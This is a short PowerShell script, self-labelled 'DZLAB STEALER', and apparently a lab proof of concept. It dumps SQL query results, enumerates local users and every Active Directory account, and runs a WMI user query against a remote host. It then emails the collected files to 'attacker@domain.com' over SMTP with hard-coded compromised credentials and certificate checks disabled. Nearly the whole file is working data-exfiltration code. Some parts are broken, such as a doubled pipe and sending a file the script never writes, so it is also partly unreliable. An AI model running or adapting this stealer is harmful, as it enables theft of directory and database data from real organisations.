import-module sqlps;
$mydatadump = invoke-sqlcmd -InputFile "Full Path to .SQL Query" -serverinstance -InstanceName -database DBToRunOn;
$mydatadump | out-file dumps.sql;

remove-module sqlps;

$username = "domain/userhacked";
$password = "password";

$path = "C:\hacked_$(get-date -f MM-dd).txt";

$poc = "C:\poc_$(get-date -f MM-dd).txt";

Get-LocalUser | Select * | Out-File -FilePath $poc;

Invoke-Command -ComputerName LabMachine2k16 { gwmi win32_UserAccount} | Select Name, FullName, Caption, Domain, SID | ft -AutoSize | | Out-File -FilePath $poc;

Get-ADUser -Filter * -Properties * | Select Name, DisplayName, SamAccountName, UserPrincipalName  | Out-File -FilePath $poc;

function Send-ToEmail([string]$email, [string]$attachmentpath){

    
    $message = new-object Net.Mail.MailMessage;
    $message.From = "hackeduser@domain.com";
    $message.To.Add($email);
    $message.Subject = "SQL2SMTP";
    $message.Body = "DUMPED INFO ---- DZLAB STEALER";

    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);
    $smtp = new-object Net.Mail.SmtpClient("smtp.domain.com");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { return $true }
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "attacker@domain.com" -attachmentpath $path;

Write-Host 'POC ENUM !'

Send-ToEmail  -email "attacker@domain.com" -attachmentpath $poc;
